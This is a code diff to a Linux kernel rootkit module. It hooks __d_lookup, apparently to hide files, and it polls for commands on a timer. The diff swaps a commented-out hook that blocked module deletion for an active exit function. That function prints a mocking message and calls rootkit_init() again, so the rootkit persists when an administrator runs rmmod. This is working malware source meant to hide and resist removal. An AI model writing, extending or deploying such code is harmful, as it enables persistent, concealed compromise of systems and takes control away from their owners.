@@ -157,20 +157,6 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 }
 
 /**
- * Block removal of the rootkit
- */
-
-// KHOOK(delete_module);
-// static long khook_delete_module(const char __user *name_user, unsigned int flags) {
-//     if (!strncmp(module_name, name_user, strlen(module_name))) {
-//         printk(KERN_INFO "This sounds like a good time to reinstall your OS.");
-//         return -ENOENT;
-//     }
-//     printk(KERN_INFO "Not trying to remove our module.");
-//     return KHOOK_ORIGIN(delete_module, name_user, flags);
-// }
-
-/**
  * Timer and Command Polling Functions
  * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
  */
@@ -258,13 +244,12 @@ static int __init rootkit_init(void) {
 }
 
 /**
- * Called at exit. All cleanup should be done here.
+ * Called when $ rmmod is executed. This function stops the rootkit from being removed.
  */
-// static void __exit rootkit_exit(void) {
-//     printk(KERN_INFO "Cleaning up rootkit.\n");
-//     khook_cleanup();
-//     timer_cleanup_wrapper(&polling_timer);
-// }
+static void __exit rootkit_exit(void) {
+    printk(KERN_INFO "Cleaning up rootkit.\nJust kidding. This sounds like a good time to reinstall your OS.");
+    rootkit_init();
+}
 
 module_init(rootkit_init);
-// module_exit(rootkit_exit);
+module_exit(rootkit_exit);
